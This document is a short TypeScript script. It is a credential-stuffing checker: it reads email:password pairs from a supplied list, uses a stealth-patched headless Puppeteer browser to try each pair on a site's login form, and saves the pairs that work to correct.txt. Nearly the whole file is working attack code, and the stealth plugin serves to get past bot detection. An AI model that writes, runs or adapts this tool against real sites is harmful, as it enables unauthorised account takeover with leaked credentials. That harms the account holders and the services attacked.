import getConnection from './server'
import readline from 'readline'
require('dotenv').config()
const fs = require('fs')
const puppeteer = require('puppeteer-extra')
const StealthPlugin = require('puppeteer-extra-plugin-stealth')
puppeteer.use(StealthPlugin())


async function processar () {  
 var inputScan = readline.createInterface({
   input: process.stdin,
   output: process.stdout  
 })

 inputScan.question("DIGIT YOUR LIST.TXT: ", async function(awser: any){
  var archive = fs.readFileSync(`${awser}`, 'utf-8')
  inputScan.close()
  var lines = archive.split(/\r?\n/)
 
  
 for(let line of lines) {
    var newline = line.split(':')

    console.log(`Email: ${newline[0]}, Senha: ${newline[1]}`)

    const browser = await puppeteer.launch({
            headless: true,
          });
          
          const page = await browser.newPage();
          
          await page.goto('https://www.example.com');
          await page.waitForTimeout(1000)
          try {
          
          await page.type('[name="username"]', newline[0])
           
          await page.type('[name="password"]', newline[1])

          await page.waitForTimeout(1000)
            await page.click('[class="submit"]')
            await page.waitForTimeout(1000)
          let clicar =  await page.waitForSelector('[id="loginError"]', {visible: true});
           if (clicar) {
             console.log('\x1b[31m', "Credentials Error")
           }
          } catch (warning) {            
            fs.appendFile('correct.txt', `${newline[0]}, ${newline[1]}, '\n\r'`, function (err:any) {
              if (err) throw err;
              console.log('\x1b[32m', 'Credentials Correct!!!' + warning);
            })
          }
          await browser.close()
    }  
  })
}
processar()
